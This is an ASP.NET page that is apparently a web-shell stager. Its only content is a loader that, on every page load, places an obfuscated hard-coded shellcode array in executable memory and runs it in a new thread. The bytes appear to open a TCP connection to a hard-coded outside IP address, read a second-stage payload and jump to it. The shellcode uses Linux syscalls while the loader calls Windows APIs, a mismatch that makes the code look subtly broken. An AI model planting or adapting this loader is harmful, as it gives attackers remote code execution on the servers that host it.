<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    protected void Page_Load(object sender, EventArgs e)
    {
        byte[] sOPzVMPg08n = new byte[130] {
0x48,0x31,0xff,0x6a,0x09,0x58,0x99,0xb6,0x10,0x48,0x89,0xd6,0x4d,0x31,0xc9,0x6a,0x22,0x41,0x5a,0xb2,0x07,0x0f,0x05,0x48,0x85,
0xc0,0x78,0x51,0x6a,0x0a,0x41,0x59,0x50,0x6a,0x29,0x58,0x99,0x6a,0x02,0x5f,0x6a,0x01,0x5e,0x0f,0x05,0x48,0x85,0xc0,0x78,0x3b,
0x48,0x97,0x48,0xb9,0x02,0x00,0x21,0x25,0xa7,0xac,0xeb,0x8d,0x51,0x48,0x89,0xe6,0x6a,0x10,0x5a,0x6a,0x2a,0x58,0x0f,0x05,0x59,
0x48,0x85,0xc0,0x79,0x25,0x49,0xff,0xc9,0x74,0x18,0x57,0x6a,0x23,0x58,0x6a,0x00,0x6a,0x05,0x48,0x89,0xe7,0x48,0x31,0xf6,0x0f,
0x05,0x59,0x59,0x5f,0x48,0x85,0xc0,0x79,0xc7,0x6a,0x3c,0x58,0x6a,0x01,0x5f,0x0f,0x05,0x5e,0x6a,0x26,0x5a,0x0f,0x05,0x48,0x85,
0xc0,0x78,0xed,0xff,0xe6 };

        IntPtr mhsoI5AM = VirtualAlloc(IntPtr.Zero,(UIntPtr)sOPzVMPg08n.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(sOPzVMPg08n,0,mhsoI5AM,sOPzVMPg08n.Length);
        IntPtr xk_aXI4Vw = IntPtr.Zero;
        IntPtr zFcjGlSpx = CreateThread(IntPtr.Zero,UIntPtr.Zero,mhsoI5AM,IntPtr.Zero,0,ref xk_aXI4Vw);
    }
</script>
